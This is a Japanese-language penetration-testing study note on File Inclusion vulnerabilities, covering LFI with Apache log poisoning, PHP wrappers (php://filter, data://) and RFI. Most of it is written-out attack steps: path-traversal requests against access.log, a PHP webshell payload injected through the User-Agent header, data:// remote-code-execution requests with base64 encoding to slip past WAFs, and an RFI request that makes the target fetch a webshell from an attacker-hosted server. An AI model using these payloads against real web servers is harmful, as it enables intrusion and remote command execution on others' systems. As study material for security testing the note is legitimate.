# 概要

Path traversalとの違い：

|手法|できること|
|---|---|
|Path traversal|任意のファイルを**読み取る**|
|File Inclusion|任意のファイルを**実行する**（＋読み取りも可）|

File Inclusionはファイルを実行できるため、任意のコマンド実行（RCE）が可能であり、Path traversalより深刻な脆弱性。

|種類|説明|
|---|---|
|LFI（Local File Inclusion）|ターゲットの**ローカル**環境にあるファイルを読み込ませる|
|RFI（Remote File Inclusion）|**リモート**（主に攻撃者がホストする）のファイルを読み込ませる|

---

# LFI

## LFI × ログポイズニング

Webサーバーのアクセスログに悪意あるWebShellコードを書き込み、LFIで実行させる手法。

**攻撃条件：**

- ログファイルの場所がわかっていること
- ログファイルにユーザー制御可能な値が記録されていること（User-Agentなど）

**ログファイルの場所：**

- Linux（Apache）：`/var/log/apache2/access.log`
- Windows（XAMPP）：`C:\xampp\apache\logs\`
- その他はWebサーバーソフトウェアのドキュメントを参照

### 手順

1. LFIでログファイルを読み取り、何が記録されるかを確認する
```zsh
curl http://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
	↓
```
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 ..."
```
- → User-Agentがログに記録される＝ユーザー制御可能と判断できる

2. Burp SuiteでUser-AgentにWebShellペイロードを注入してリクエストを送る
```php
<?php echo system($_GET['cmd']); ?>
```

![](../../Images/Pasted%20image%2020250322224544.png)

$$User-Agentにペイロードを注入$$

3. LFIでログファイルを読み込み、WebShellが実行されるか確認する（URLエンコードすること）
```http
GET /index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
```
- →`ps`の結果が返ってきたら成功

4. リバースシェルリスナーを立て、リバースシェルコマンドをURLエンコードして実行する（[Bashだけで完結する手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Bashだけで完結する手法)）

---

## PHP Wrappers

PHPのwrapperを使ってLFIを拡張できる。

### php://filter

**用途：** PHPファイルの内容を**実行せずに**表示する。コードの中身を丸ごと閲覧でき、機密情報の取得やアプリのロジック解析に使える。

> [!NOTE] 
> `.php` だけでなく `.py` など他の実行可能ファイルにも使える。

#### 手順

1. HTTPリクエストでファイルを指定している箇所を見つける（例）
```
http://example.com/index.php?page=admin.php
```

2. Burp Suiteでファイルを実行した結果を確認し、タグが閉じられていないなど不自然なコードがないか探す

![](../../Images/Pasted%20image%2020250329113419.png)

$$bodyタグが閉じられていない$$

3. `php://filter` wrapperでファイルの中身を表示する（結果が変わらない場合は次のステップへ）
```
GET /index.php?page=php://filter/resource=admin.php
```

4. Base64エンコードして中身を取得する
```
GET /index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

5. 取得したBase64文字列をデコードすると、中身がすべて表示される
```zsh
echo "<base64_encoded_resource>" | base64 -d
```

### data://

**用途：** 任意のコードをリクエストに直接埋め込んで実行させる（RCE）。

**攻撃シチュエーション：** WebアプリにPHPコードを直接書き込めない場合（WebShellが使えないときなど）に使う。

> [!WARNING] 
> PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。

#### 手順

1. HTTPリクエストでファイルを指定している箇所を見つける
   
2. Burp Suiteで `data://` を使って任意のコマンドを実行する
```http
GET /index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
```

3. WAFなどでブロックされる場合はBase64エンコードして試す
```zsh
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```
```http
GET /index.php?page=data://text/plain;base64,<base64_encoded_php_code>&cmd=ls
```

#### 参考

- filter：🔗[php manual - wrappers.php](https://www.php.net/manual/en/wrappers.php.php)
- data：🔗[php manual - wrappers.data](https://www.php.net/manual/en/wrappers.data.php)
- その他wrapper：🔗[php manual - wrappers](https://www.php.net/manual/en/wrappers.php)

---

# RFI（Remote File Inclusion）

**用途：** LFIとほぼ同じだが、HTTP/SMBを介して**リモートシステム**（攻撃者がホストするサーバーなど）からファイルをインクルードして実行できる。

> [!WARNING]
> PHPの `allow_url_include` が有効でないと使えない（デフォルト無効）。

## 手順

1. ターゲットに実行させたいファイル（WebShell）を攻撃者のマシンに用意する
    - `/usr/share/webshells/php/`
    - pentest-monkeyのreverse shellなど

2. ファイルをホストしているディレクトリでWebサーバーを起動する
```zsh
sudo python3 -m http.server 80
```

3. Burp Suiteで攻撃者がホストするファイルをターゲットに実行させる
```http
GET /index.php?page=http://<attacker_IP>/<webshell.php>&cmd=ls
```